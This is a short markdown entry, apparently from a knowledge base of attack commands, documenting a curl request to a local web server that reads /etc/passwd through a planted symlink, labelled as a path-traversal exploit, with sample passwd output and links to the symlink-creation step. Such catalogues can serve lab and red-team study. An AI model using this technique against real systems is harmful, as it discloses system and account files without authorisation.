---
id: cmd-uuid-004
data: 'curl localhost:8080/passwdsym'
tags:
  - http
  - exploit
type: command
output: >-
  Contents of /etc/passwd file, e.g., 'root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ...'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:17.365Z'
verified: false
validated: true
submitted: true
---
# curl-access-symlink

## Command

```bash
curl localhost:8080/passwdsym
```

## Description

Sends an HTTP GET request to retrieve the contents of the symlink, exploiting path traversal.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `localhost:8080/passwdsym` | URL to the symlink | Yes |

## Examples

### Basic Usage

```bash
curl localhost:8080/passwdsym
```

### Advanced Usage

```bash
curl -v localhost:8080/passwdsym > output.txt
```

## Expected Output

root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...

## Related

- [[commands/ln-create-symlink-passwd]]
- [[procedures/Access-Symlink-via-HTTP-Request]]
